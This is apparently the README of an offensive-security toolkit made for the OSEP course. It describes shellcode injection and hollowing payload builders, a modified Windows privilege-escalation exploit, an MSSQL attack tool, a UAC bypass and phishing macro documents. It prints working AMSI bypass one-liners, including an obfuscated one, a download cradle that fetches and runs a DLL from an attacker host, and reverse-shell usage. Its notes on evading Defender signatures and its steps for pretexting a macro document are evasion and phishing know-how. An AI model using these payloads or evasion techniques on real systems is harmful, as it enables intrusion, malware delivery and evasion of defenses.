# Disclaimer

All of these tools were developed for use in the OSEP course.  During development of them, as I learned more, in many cases I went above and beyond what the course taught because I figured "Why not build things against latest patch AV?".  That is not to say that all of the things in this repo are now beating Live Defender; however at one point or another, most of them were.  I hope that they may be of use to others, either for direct usage or to serve as inspiration for further work.

There is very little in terms of actual novel tradecraft here; it is a combination of a myriad of resources provided by people far smarter than I.  The majority of the heavy lifting I did here was towards automation.  I wanted an easy, standardized way to generate payloads for use in the OSEP course. All powershell and C# payloads contained within this repo utilize AES-256 encryption on the shellcode as well as a sleep statement for sandbox detection/evasion.

I offer no guarantees of any kind when using this stuff.  Nothing in here was designed for public release, I am doing so after many requests.  Make sure you read the notes provided on each tool in this README.

# Tools

Powerinject.py - Python3 script to generate .PS1 payloads that perform process injection.

Powerhollow.py - Python3 script to generate .PS1 payloads that perform process hollowing with PPID spoofing.

Formatshellcode.py - Python3 script to format C# shellcode output by msfvenom into proper format for use with Builder.exe.

Port_ipeggs.py - Python3 script to format C# shellcode output by msfvenom into proper format for user with Builder.exe. FOR USE WITH CLI PAYLOADS! **NOTE: Does not work with all payloads.  Confirmed works with reverse_tcp, confirmed DOES NOT work with HTTPS

NonDN2J.hta - hta file that utilizes bitsadmin, certutil, and installutil to download and execute a exe payload (installutil bypass capable) on victim click

D_Invoke - C# project that produces D/invoke payloads (basic, injector, hollower + ppid spoof) in exe, dll, or service exe format.  Use pre-built builder.exe in the D_Invoke directory.

Shakeitoff - Modification of https://github.com/jbaines-r7/shakeitoff (CVE-2021-41379 variant) that allows user to specify file to replace target binary with and then starts the Microsoft Edge Elevation Service in order to execute the malicous binary. You need both the shakeitoff.exe and the shakeitoff.msi on target.  Note that this will replace the elevation_service.exe so make a copy of it if you need to restore! Tested successfully on Windows 10, 11, Server 2016, and Server 2019. This is patched as of Dec 14th 2021 (KB5008212) and was assigned the new CVE-2021-43883. Check out the above linked repo for more information on the exploit and how to use it.
````
Usage: shakeitoff.exe -m c:\users\user\shakeitoff\shakeitoff.msi -i c:\users\user\write\ -c c:\users\user\source\repos\d_invoke\inject.exe -p "C:\Program Files (x86)\Microsoft\Edge\Application\96.0.1054.53\elevation_service.exe"
````

clinject - C# project source code for (IP + port + process) cli passed process injection payload. Use multi/handler with windows/x64/meterpreter/reverse_tcp
````
clinject.exe 192.168.1.198 443 explorer
````

clhollow - C# project source code for (IP + port + process + parent-process) cli passed process hollowing payload. Use multi/handler with windows/x64/meterpreter/reverse_tcp
````
clhollow.exe 192.168.1.198 443 c:\\windows\\system32\\svchost.exe explorer 
````
sql - C# project source code for SQL.exe project for exploitation of MSSQL servers in AD.

x64_met_staged_reversetcp_inject.exe - Command line args: IP PORT PROCESS_TO_INJECT(explorer)

x64_met_staged_reversetcp_hollow.exe - Command line args: IP PORT PROCESS_TO_HOLLOW(c:\\windows\\system32\\svchost.exe) PPID_SPOOF(explorer) 
  
x64_met_staged_reversehttps_inject.exe - Command line args: IP PORT PROCESS_TO_INJECT(explorer)

x64_met_staged_reversehttps_hollow.exe - Command line args: IP PORT PROCESS_TO_HOLLOW(c:\\windows\\system32\\svchost.exe) PPID_SPOOF(explorer) 
  
ps-bypass - For use with InstallUtil. Contains AMSI binary patch. Will start an interactive powershell session in FullLanguageMode.

alt-bypass - Alternate custom ps-runspace for use in evading Applicatoin whitelisting.  Will start and interactive powershell session in FullLanguageMode and functions better over remote shells than ps-bypass.  Combination of https://github.com/superhac/OSEP/blob/main/InteractiveRunspace.cs and https://github.com/calebstewart/bypass-clm with a dynamic patch for AMSI.  The AMSI patch works by locating AmsiUacInitialize and then locating the actual functions we want to patch (AmsiScanBuffer and AmsiScanString) by grabbing the 1000 bytes preceding AmsiUacInitiliaze and then locating the functions within them by byte array. This avoids the issue of hardcoding the offsets of the target functions from AmsiUacInitialize when the location of the functions change depending on Windows version. 

Word_pscradle.docm - Word doc with caeser cipher encoding that calls powershell download cradle.  Use with vbobfuscate.ps1 to generate and replace obfuscated text in pscradle.docm. This uses WMI dechaining, so still use x64 shellcode even if you are targeting x86 word!

vbobfuscate.ps1 - ps1 to generate caeser cipher code for pscradle.  Make sure offsets match for encrypt/decrypt. First output is download cradle, last is app name for app name check before running. 

uacbypass.ps1 - UAC bypass using FODhelper to elevate priviliges on a user account who has Administrator privs but is running in a medium integrity process. Usage: Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass;. .\bypass.ps1;alt
  

# NOTES
D_invoke: 

This is a package built using TheWover's project and research as the foundation (https://github.com/TheWover/DInvoke, https://thewover.github.io/Dynamic-Invoke/).

The inspiration for this project was to simplify the process of generating compiled C# payloads.  By using this project, a user never need open visual studio when creating payloads.

The steps for usage are this:

1. Generate shellcode (This was built with msfvenom shellcode in c# as the primary input, however it was retooled to take .bin files during some testing with cobaltsrike)
2. Format shellcode for use with Builder.exe (formatshellcode.py script does this with msfvenom shellcode)
3. Transfer formatted shellcode to windows dev machine
4. Run builder.exe with the proper switches
5. Voila. You have your AES encryped shellcode D/invoke payload in whatever format and technique you want!

The foundation of this package is Builder.exe.  This application allows the user to specify several options to include:

Format of payload (exe, dll, service exe)
Technique (local injection, remote injection, or process hollowing with PPID spoofing)
Shellcode file (file containing parsed shellcode.  Formatshellcode.py is written to properly parse msfvenom csharp format shellcode for user with builder.exe)
Process name (Process for remote injection OR process to spawn for hollowing)
Parent Process (Process for PPID spoofing with process hollowing technique)
Architecture (x86, x64)

After the user specifies all the above options, a "template.cs" file within the selected format project (exe, dll, service) will be edited and the payload pieced together.  Builder.exe has hardcoded within it the necessary code for the various options (d/invoke statements for hollowing w/ ppid spoofing for example) that will be placed into the template file in the proper manner in the given format (exe, dll, service exe).  Builder will AES-256 encrypt the shellcode (generating a new key and IV each time it is run) and embed the encrypted shellcode within the template file. Once the template file is complete, it will be saved over program.cs in the respective format project.  MSBuild will the be called on the updated program.cs file in order to create the final payload in exe, dll, or service exe format.

The produced payloads use D/invoke statements for most, but not all of the API calls. Certain simple ones (As well as certain complex ones in the process hollowing payload) still use p/invoke. An Installutil bypass is baked into each .Exe payload for use in case application whitelisting is in place. Additionally direct syscalls have not been implemented in this project... It is maybe a direction for further work however given that certain EDR's don't even hook userland syscalls anymore, I haven't done this yet as I need to do more research on the correct direction to go in the future. 

Note that this tool was developed for personal use, not production.  As such there are some shortcomings in that there are hardcoded paths where Builder.exe expects to find things. Builder.exe should only be run from within the d/invoke folder (i.e. builder.exe should be in the same folder as the dll, exe, and service folders as it is on the hosted repo).  Additionally MSBuild is hardcoded for VS2019. If you are utilizing a different version, you will need to edit the source code of Builder.exe and update it with the path to MSBuild within your version.
  
Powerinject.py and Powerhollow.py:

These python scripts call msfvenom to generate shellcode, AES encrypt it, and then embed it within hardcoded powershell code in order to dynamically produce .PS1 payloads according to user supplied options.  These .PS1 payloads are modeled after the OSEP .PS1 that utilizes dynamic lookup rather than add-type in order to prevent writing to disk when calling csc.  Powerinject.py payloads succeed here; however I was unable to find a way to define the structs necessary for doing PPID spoofing with Process hollowing, so add-type IS called in the Powerhollow .PS1 payloads, however this is only done for the necessesary structs and the createprocess Win32API, all other required API's are resolved dynamically.

Run the appropriate python script for the kind of payload you want to use and then place the produced files in your webserver directory and use the supplied PS one liner in order to call them.

Clinject and Clhollow:

These are C# projects that have been modified in order to accept command line Lhost, Lport, and processes for targeting.  This allows a user to drop the payload on whatever target machine without worry of needing to re-roll shellcode if the attackers IP changes, or the payload needs to be pointed at a different machine in order to hit a tunnel and egress the network.  This was accomplished by using Msfvenom to create shellcode and then locating the IP and port that was specified in the msfvenom command within the output shellcode.  These bytes were replaced with unique identifier strings.  This process was accomplished with the "Port_ipeggs.py" script.  This shellcode was then AES encrypted and placed in the C# project and functionality added to received command line args specifying the Lport and Lhost.  On run time, the shellcode is decrypted and then the IP and port given by the attacker is converted to hex and placed in the proper location wthin the decyrpted shellcode as marked by the unique identifer string.

Example usage: clinject.exe 192.168.1.1 443 explorer

SQL:

This project is a pretty robust tool for exploitation of MSSQL instances.  Features include:
Enumeration of MSSQL instances (calls setspn).
Enumeration of linked SQL servers, users, users that can be impersonated, user context.
Execute arbitrary SQL commands
Enable XP_cmdshell or OLE objects on the current or a linked server
Execute XP_cmdshell or OLE object commands on the current or a linked server
Force authentication of SQL server to an SMB share for use with ntlmrelayx

These features are all functional over bidirectional links.
Installutil bypass is baked in so this tool can be run on a machine with Application whitelisting in place. 

Powershell AMSI bypass:
  
  Win10
  ````
  $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
  ````
  Win10+Win11
  
  ````
  S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
  ````
 Powershell Dll download cradle (replace ip/file name but leave rest as is when using D/invoke builder generated payloads!):
  ````
 $data = (New-Object System.Net.WebClient).DownloadData('http://192.168.1.195/basic.dll');$assem = [System.Reflection.Assembly]::Load($data);$class = $assem.GetType("dll.Class1");$method = $class.GetMethod("runner");$method.Invoke(0, $null)  
  ````
With Powerinject/Powerhollow make sure you think about whether you will be calling PS download cradle from powershell or cmd.exe and use the appropriate mode when constructing payloads.  When you call powershell.exe <cradle> from cmd.exe or even from another powershell window, you are creating a child process and while the embedded AMSI bypass may work for the child process the parent process will detect the child performing malicious actions and flag it.
  
Do NOT use msfvenom encoders with any Hollowing tool. Causes problems.
  
Injection tools:
    Your target for injection must be of the same integrity or lower than the method by which you have code execution.  I.e. if you are running in medium integrity you cannot inject into spoolsv, inject into explorer.
  
Hollowing tools:
    Your target parent process for PPID spoofing must be of the same integrity or lower than the method by which you have code execution. I.e. if you are running in medium integrity you cannot specify spoolsv as the parent process.  Hollowed process will inherit the integrity of parent process.
  
  On Word Macros:
  
  WordMacroRunner - This is a baseline runner that will return a shell from WINWORD.exe. Has capabilities to detect AMSI and patch it if found (for both 32bit and 64 bit) as well as contains shellcode for both 32bit and 64 bit Word so it can execute after detecting architecture. 
  
  WordMacroInject - This macro performs process injection.  Currently specified for explorer.exe. NOTE: This runner is really only good for 64-bit word.  Seeing as we have no idea what version of word an organization will be running, the use case for this is limited.  The issue stems from the fact that 32 bit processes cannot easily inject into 64 bit ones; The presumed typical target environment will be running 32 bit word on a 64 bit OS, which renders the injection into explorer impossible.  There are advanced techniques out there that might be able to facilitate this (Heaven's gate) but no idea if they could be implemented in VBA. Additionally there is no telling what/if any other 32 bit processes suitable for injection might be running on a target machine.  In theory code could be written to enumerate running 32 bit processes and then just try to inject into an arbitrary one, but there are obvious issues concerning stability, and longevity of the process to maintain a reverse shell.  In reality just using a non-injecting runner and then setting up a C2 to automigrate is probably best practice as they are equipped to do so.
  
  Setup/formatting information:
  1. Write "legitimate" contents of the word doc, select all, then navigate to Insert > Quick Parts > AutoTexts and Save Selection to AutoText Gallery
  2. Give it a name, make sure it's saved to that particular document and not a template. Hit ok. Then delete the content from the body of the word doc.
  3. Copy in/write your pretexting content to the body of the word doc.  This is the piece that include "enable macros, hit this key combo to execute" etc.
  4. Go to Macro's and click record new macro.  Ensure on both screens you select the current document and not a template.  Click keyboard and then hit a key combination to map (e.g. Alt + D).  Once you hit ok/close, recording will begin.  Then go click macros again, view, select the main runner sub, and then click run.  This will map that sequence to Alt + D so that when it is entered the runner sub will be executed.
  
  To DOs:
  Integrate Injection runner with baseline runner so that injection is performed if x64 word is detected.
  Implement dynamic AMSI search capability as seen here: https://secureyourit.co.uk/wp/2019/05/10/dynamic-microsoft-office-365-amsi-in-memory-bypass-using-vba/
  
  Discoveries:
  Latest patch defender (Oct 2021) seems to have an "AND" based signature for AutoOpen().  It can be used in macros for benign purposes but as soon as API calls are included (or at least things used in shellcode runners), it flags signature based detection.
  RtlMoveMemory API call is signatured.  Use RtlFillMemory instead. 
  Resolve Amsi.dll and the function calls within it either dynamically or heavily obfuscated when you go to patch it.
  Starting in Word 2019 the program is 64 bit by default. This means Word 2019,O365,2021 are all good candidates for Injection because Orgs/individuals would have to go out of their way to have downloaded the 32 bit one.
  Meterpreter shells after using Migrate seem to get caught by defender sometimes... Doesn't seem to be the case for straight up injection payloads.
  
# RESOURCES
  https://depthsecurity.com/blog/obfuscating-malicious-macro-enabled-word-docs
  https://secureyourit.co.uk/wp/2020/04/18/enumerating-process-modules-in-vba/
  
 
